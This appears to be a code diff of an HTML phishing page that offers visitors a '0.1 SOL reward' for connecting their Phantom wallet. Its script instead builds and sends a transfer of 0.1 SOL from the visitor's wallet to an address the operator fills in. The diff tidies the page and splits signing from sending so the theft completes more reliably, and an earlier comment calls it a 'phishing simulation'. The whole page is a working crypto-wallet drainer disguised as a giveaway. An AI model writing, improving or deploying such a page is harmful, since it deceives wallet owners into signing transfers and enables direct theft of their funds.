@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Claim Reward</title>
-    <!-- Phantom Wallet SDK -->
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #000;
             color: #fff;
             display: flex;
@@ -20,23 +20,10 @@
             text-align: center;
         }
 
-        .container {
-            padding: 20px;
-            max-width: 90%;
-        }
+        .container { padding: 20px; width: 90%; }
+        h1 { font-size: 2rem; margin-bottom: 10px; }
+        p { color: #ccc; margin-bottom: 30px; }
 
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            color: #fff;
-        }
-
-        p {
-            color: #ccc;
-            margin-bottom: 30px;
-        }
-
-        /* The Green Button */
         .btn-green {
             background-color: #00ff88;
             color: #000;
@@ -47,34 +34,15 @@
             border-radius: 30px;
             cursor: pointer;
             box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
-            transition: transform 0.2s;
-        }
-
-        .btn-green:active {
-            transform: scale(0.95);
+            width: 100%;
         }
 
         #status {
             margin-top: 20px;
-            font-size: 1rem;
+            font-size: 0.9rem;
             color: #00ff88;
-            min-height: 24px;
-        }
-
-        /* Loading Spinner */
-        .spinner {
-            display: none;
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+            min-height: 50px;
+            word-wrap: break-word;
         }
     </style>
 </head>
@@ -82,69 +50,89 @@
 
     <div class="container">
         <h1>SOL Reward</h1>
-        <p>Connect your Phantom Wallet to claim 0.1 SOL.</p>
+        <p>Connect Phantom Wallet to claim 0.1 SOL.</p>
         
         <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
         
-        <div id="spinner" class="spinner"></div>
         <div id="status"></div>
     </div>
 
     <script>
+        // ==========================================
         // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
-        const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
+        // ==========================================
+        const RECIPIENT_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"; 
         
-        // Helper to convert string address to PublicKey
-        function getPublicKey() {
-            return new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
-        }
-
         async function initiateClaim() {
             const statusDiv = document.getElementById("status");
-            const spinner = document.getElementById("spinner");
             const btn = document.getElementById("connectBtn");
 
-            // 1. Check if Phantom is installed
+            // 1. Check for Phantom
             if (!window.solana || !window.solana.isPhantom) {
                 alert("Please install Phantom Wallet on your iPhone.");
                 return;
             }
 
             try {
-                // 2. Request Connection (Permissions)
                 statusDiv.innerText = "Connecting...";
-                const resp = await window.solana.connect();
                 
-                // Get the user's public key from the connection response
+                // 2. Connect
+                const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
+                
+                // 3. Define Recipient
+                let recipientPubkey;
+                try {
+                    recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
+                } catch (e) {
+                    alert("Invalid Recipient Address in code.");
+                    return;
+                }
 
-                // 3. Build Transaction
-                // We are sending 0.1 SOL (100,000,000 lamports) to your address
+                // 4. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Add a transfer instruction: From User -> To You
+                // Transfer 0.1 SOL (100,000,000 lamports)
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
-                        toPubkey: getPublicKey(),
-                        lamports: 100000000, // 0.1 SOL
+                        toPubkey: recipientPubkey,
+                        lamports: 100000000 
                     })
                 );
 
-                // 4. Send Transaction to Phantom for Signature
                 statusDiv.innerText = "Sign Green...";
                 
-                // We use sendAndConfirmTransaction but Phantom usually prefers signTransaction + sendTransaction
-                // However, for simple phishing simulation, we can use the standard flow or ask for signature
+                // --- STEP 1: SIGN (This opens Phantom) ---
+                const signedTx = await window.solana.signTransaction(transaction);
+                console.log("Transaction Signed");
+
+                // --- STEP 2: SEND (This sends to network) ---
+                statusDiv.innerText = "Sending transaction...";
                 
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                // Use sendTransaction with the pre-signed transaction
+                const signature = await window.solana.sendTransaction(signedTx, {
+                    skipPreflight: false, // Important for accurate error feedback
+                    commitment: 'singleGossip'
+                });
+
+                console.log("Transaction Sent:", signature);
                 
-                statusDiv.innerText = "Success! Check your wallet.";
+                alert("Success! 0.1 SOL sent.");
                 btn.style.display = 'none';
+                statusDiv.innerText = "Sent: " + signature;
 
             } catch (err) {
                 console.error(err);
-                statusDiv.innerText = "Cancelled by user.";
+                // Check for specific cancel errors
+                if (err.message && err.message.includes("User rejected")) {
+                    statusDiv.innerText = "Cancelled by user.";
+                } else if (err.message && err.message.includes("cancelled")) {
+                    statusDiv.innerText = "Transaction cancelled or timed out.";
+                } else {
+                    alert("Error: " + (err.message || "Unknown error"));
+                    statusDiv.innerText = "Error: " + (err.message || "Unknown error");
+                }
             }
         }
     </script>
